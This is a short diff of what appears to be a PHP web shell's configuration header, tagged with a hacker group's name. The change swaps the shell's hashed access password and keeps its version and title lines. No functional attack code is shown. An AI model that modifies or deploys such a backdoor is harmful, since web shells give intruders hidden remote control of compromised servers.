@@ -2,7 +2,7 @@
 /*
  #T3am #Ⱨ₳₵₭ɆRST0 #ByHash ;)
 */
-$s_pass = "1074336268ea444474d84bbc8333614f1c5a134e"; // SHA1(MD5(pass))
+$s_pass = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // SHA1(MD5(pass))
 
 $s_ver = "404"; // shell ver
 $s_title = "Ⱨ₳₵₭ɆRST0".$s_ver; // shell title
